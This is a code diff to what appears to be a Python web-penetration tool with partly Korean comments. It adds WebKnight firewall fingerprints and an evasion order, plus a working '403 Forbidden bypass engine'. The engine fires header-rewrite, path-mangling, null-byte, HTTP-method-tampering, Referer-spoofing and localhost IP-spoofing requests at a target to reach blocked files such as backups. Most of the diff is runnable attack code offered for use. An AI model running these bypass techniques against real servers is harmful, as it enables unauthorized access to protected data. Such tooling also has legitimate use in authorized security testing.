@@ -99,6 +99,12 @@ WAF_SIGNATURES: dict[str, dict] = {
         "body": ["nginx waf", "bad request", "invalid request"],
         "header_val": {"server": ["nginx"]},
     },
+    "webknight": {
+        "status": [999, 403],
+        "body": ["no hacking", "webknight", "firewall alert", "security alert",
+                 "attack detected", "access denied by webknight", "wk_block"],
+        "header_val": {"server": ["iis", "www server/1.1", "microsoft-iis"]},
+    },
     "generic": {
         "status": [403, 406, 501],
         "body": ["access denied", "forbidden", "blocked", "security", "firewall"],
@@ -399,6 +405,8 @@ class WafDetector:
             "wallarm":          ["function", "encoding", "space", "keyword", "header"],
             # Nginx WAF: 공백 + 함수 대체
             "nginx_waf":        ["space", "function", "keyword", "encoding"],
+            # WebKnight (IIS ISAPI): multipart > chunked > verb tamper > path > HPP
+            "webknight":        ["multipart", "chunked", "verb", "path", "header", "encoding"],
             # 범용
             "generic":          ["space", "keyword", "header", "encoding", "function"],
         }
@@ -1058,3 +1066,126 @@ def tamper(payload, **kwargs):
         if prefix == original[:len(prefix)] and suffix == original[-len(suffix):]:
             return "", ""
         return prefix, suffix
+
+
+# ══════════════════════════════════════════════════════════════
+# 403 Forbidden Bypass Engine
+# IIS/WebKnight에서 존재하지만 접근 차단된 파일 우회
+# ══════════════════════════════════════════════════════════════
+
+@dataclass
+class ForbiddenBypassResult:
+    technique: str
+    url_used: str
+    headers_used: dict
+    status: int
+    content_length: int
+    bypassed: bool
+    evidence: str = ""
+
+
+class ForbiddenBypassEngine:
+    """403 Forbidden 우회 — IIS/WebKnight 환경 특화"""
+
+    def __init__(self, base_url: str, timeout: int = 10):
+        self.base_url = base_url.rstrip("/")
+        self.timeout = timeout
+
+    def _req(self, url: str, method: str = "GET", headers: dict | None = None) -> tuple[int, int, str]:
+        import httpx
+        try:
+            with httpx.Client(verify=False, timeout=self.timeout, follow_redirects=False) as c:
+                r = c.request(method, url, headers=headers or {})
+                return r.status_code, len(r.content), r.text[:500]
+        except Exception as e:
+            return 0, 0, str(e)
+
+    def try_all(self, path: str) -> list[ForbiddenBypassResult]:
+        """
+        path: e.g. '/data/backup.zip'
+        403 우회 기법을 순서대로 시도하고 결과 목록 반환.
+        """
+        results: list[ForbiddenBypassResult] = []
+        full_url = self.base_url + path
+
+        # 1. X-Original-URL / X-Rewrite-URL 헤더
+        for hname in ("X-Original-URL", "X-Rewrite-URL", "X-Override-URL"):
+            st, cl, body = self._req(self.base_url + "/", headers={hname: path})
+            results.append(ForbiddenBypassResult(
+                technique=f"header:{hname}", url_used=self.base_url + "/",
+                headers_used={hname: path}, status=st, content_length=cl,
+                bypassed=st not in (403, 999, 0), evidence=body[:120],
+            ))
+
+        # 2. Path variation (IIS case-insensitive + traversal)
+        path_lower = path.lower()
+        path_upper = path.upper()
+        path_dot   = path.replace("/", "/./", 1)
+        path_dslash = path.replace("/", "//", 1)
+        path_enc   = path.replace("/", "%2f")
+        for (tag, variant) in [
+            ("path_lower", path_lower),
+            ("path_upper", path_upper),
+            ("dot_segment", path_dot),
+            ("double_slash", path_dslash),
+            ("url_encoded_slash", path_enc),
+            ("semicolon_suffix", path + ";.asp"),
+            ("null_byte", path + "%00.txt"),
+            ("trailing_dot", path + "."),
+            ("dot_dot_suffix", path + "/."),
+        ]:
+            u = self.base_url + variant
+            st, cl, body = self._req(u)
+            results.append(ForbiddenBypassResult(
+                technique=f"path:{tag}", url_used=u, headers_used={},
+                status=st, content_length=cl,
+                bypassed=st not in (403, 999, 0), evidence=body[:120],
+            ))
+
+        # 3. HTTP method override
+        for method in ("HEAD", "OPTIONS", "PUT", "TRACE"):
+            st, cl, body = self._req(full_url, method=method)
+            results.append(ForbiddenBypassResult(
+                technique=f"method:{method}", url_used=full_url, headers_used={},
+                status=st, content_length=cl,
+                bypassed=st not in (403, 999, 0), evidence=body[:120],
+            ))
+
+        # 4. Referer spoofing (same-site admin)
+        referers = [self.base_url + "/manager/", self.base_url + "/admin/", self.base_url + "/"]
+        for ref in referers:
+            st, cl, body = self._req(full_url, headers={"Referer": ref})
+            results.append(ForbiddenBypassResult(
+                technique=f"referer:{ref.split('/')[-2]}", url_used=full_url,
+                headers_used={"Referer": ref}, status=st, content_length=cl,
+                bypassed=st not in (403, 999, 0), evidence=body[:120],
+            ))
+
+        # 5. IP spoofing headers
+        spoof_headers = {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Real-IP": "127.0.0.1",
+            "Client-IP": "127.0.0.1",
+        }
+        st, cl, body = self._req(full_url, headers=spoof_headers)
+        results.append(ForbiddenBypassResult(
+            technique="ip_spoof:localhost", url_used=full_url,
+            headers_used=spoof_headers, status=st, content_length=cl,
+            bypassed=st not in (403, 999, 0), evidence=body[:120],
+        ))
+
+        return results
+
+    def summary(self, path: str) -> str:
+        results = self.try_all(path)
+        bypassed = [r for r in results if r.bypassed]
+        lines = [f"403 Bypass scan for {path} ({len(results)} techniques):"]
+        if bypassed:
+            lines.append(f"  [BYPASS SUCCESS] {len(bypassed)} technique(s) worked:")
+            for r in bypassed:
+                lines.append(f"    {r.technique} → HTTP {r.status} ({r.content_length}b)")
+        else:
+            for r in results:
+                lines.append(f"  {r.technique}: HTTP {r.status} ({r.content_length}b)")
+        return "\n".join(lines)
+
